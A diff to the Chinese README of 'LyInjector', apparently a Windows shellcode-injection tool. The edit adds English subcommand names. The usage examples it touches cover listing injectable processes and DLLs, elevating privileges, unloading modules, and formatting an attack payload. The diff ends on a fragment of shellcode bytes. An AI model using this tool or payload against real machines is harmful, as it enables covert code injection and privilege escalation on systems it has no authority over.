@@ -83,8 +83,7 @@ C:\Users\admin>LyInjector
          EncodePidInFile   注入加密后的字符串到远程进程中
 ```
 
-
-- 显示当前所有可注入进程
+- Show 显示当前所有可注入进程
 
 ```c
 C:\Users\admin> LyInjector Show
@@ -101,7 +100,7 @@ C:\Users\admin> LyInjector Show
 [*] PID： 11376 | 位数：x64 | 进程名：LyInjector.exe
 ```
 
-- 显示进程内的所有DLL模块
+- ShowDll 显示进程内的所有DLL模块
 
 ```c
 C:\Users\admin> LyInjector ShowDll --proc lyshark.exe
@@ -111,7 +110,7 @@ C:\Users\admin> LyInjector ShowDll --proc lyshark.exe
 [+] DLL名称:         KERNEL32.dll | DLL基地址: 0x00000000773A0000
 ```
 
-- 尝试提升自身进程权限
+- Promote 尝试提升自身进程权限
 
 ```c
 C:\Users\admin> LyInjector Promote
@@ -121,7 +120,7 @@ C:\Users\admin> LyInjector Promote
 [*] 已提升为超级管理员
 ```
 
-- 尝试卸载指定进程内的DLL模块
+- FreeDll 尝试卸载指定进程内的DLL模块
 
 ```c
 C:\Users\admin> LyInjector FreeDll --proc lyshark.exe --dll MSVCR120D.dll
@@ -129,7 +128,7 @@ C:\Users\admin> LyInjector FreeDll --proc lyshark.exe --dll MSVCR120D.dll
 [*] 模块卸载状态: 1
 ```
 
-- 显示进程内特定模块内函数基址
+- GetFuncAddr 显示进程内特定模块内函数基址
 
 ```c
 C:\Users\admin> LyInjector GetFuncAddr --proc lyshark.exe --dll user32.dll --func MessageBoxA
@@ -141,7 +140,7 @@ C:\Users\admin> LyInjector GetFuncAddr --proc lyshark.exe --dll user32.dll --fun
 [+] 函数地址: 0x76bf10c0
 ```
 
-- 将攻击载荷格式化为一行纯字符串
+- Format 将攻击载荷格式化为一行纯字符串
 
 ```c
 "\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x64\x8b\x52\x30\x8b\x52"
